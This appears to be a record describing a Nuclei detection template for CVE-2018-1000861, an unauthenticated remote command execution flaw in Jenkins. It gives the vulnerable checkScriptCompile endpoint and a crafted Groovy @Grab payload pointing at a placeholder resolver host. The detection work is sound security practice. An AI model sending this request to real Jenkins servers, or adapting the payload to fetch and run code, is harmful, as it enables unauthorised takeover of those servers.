---
cve_id: CVE-2018-1000861
template_path: nuclei-templates/http/cves/2018/CVE-2018-1000861.yaml
affected_product: Jenkins
severity: critical
authentication: none
external_callback: false
affected_versions: Jenkins 2.153 and earlier and LTS 2.138.3 and earlier
preconditions: []
poc_classification: rce
---

## Vulnerability
Jenkins versions 2.153 and earlier and LTS 2.138.3 and earlier are susceptible to remote command injection (CVE-2018-1000861) via `stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java`. Attackers can invoke unintended Java object methods by accessing crafted URLs that were not intended to be invoked this way. CVSS 3.1 score 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H), CWE-502. Successful exploitation leads to unauthorized access, data leakage, and potential compromise of the entire Jenkins server.

## PoC / Detection
Classification: rce

The template detects the vulnerability by issuing a single GET request to `/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile` with a `value` parameter containing a crafted Groovy payload (`@GrabConfig(disableChecksums=true) @GrabResolver(name='test', root='http://aaa') @Grab(group='package', module='vulntest', version='1') import Payload;`). It matches on HTTP 200 status and the exact string `package#vulntest` appearing in the response body.

## References
- https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861
- https://nvd.nist.gov/vuln/detail/CVE-2018-1000861
- https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595
- http://packetstormsecurity.com/files/166778/Jenkins-Remote-Code-Execution.html
- https://access.redhat.com/errata/RHBA-2019:0024
